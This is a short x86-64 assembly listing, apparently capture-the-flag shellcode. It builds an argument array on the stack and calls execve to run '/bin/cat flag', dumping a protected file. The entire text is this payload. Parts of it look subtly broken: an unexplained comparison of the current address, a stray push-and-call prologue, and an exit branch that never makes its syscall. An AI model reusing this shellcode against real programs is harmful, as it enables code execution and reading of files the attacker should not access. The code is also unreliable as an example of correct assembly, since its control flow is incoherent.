section .text
    global _start

_start:
    
    push   0x42
    call   next
    pop     rdi
    mov     rax, $
    cmp     rax, 0xF
    jb      _donothing
    call RET
filename:	db 'flag', 0x00
RET:
	pop rax
	xor rdx,rdx
	push rdx
	mov rcx, '/bin/cat'
	push rcx
	mov rdi, rsp

	push rdx
	push rax
	push rdi

	xor rax, rax
	mov rsi, rsp
    xor al, al
	add al, 59
	syscall


next:
    mov rdx, 0x12345678
    ret

_donothing:
    mov    rdx, 0x12345678
    mov eax, -1  ; system call number for exit
    neg eax
    xor ebx, ebx  ; exit code 0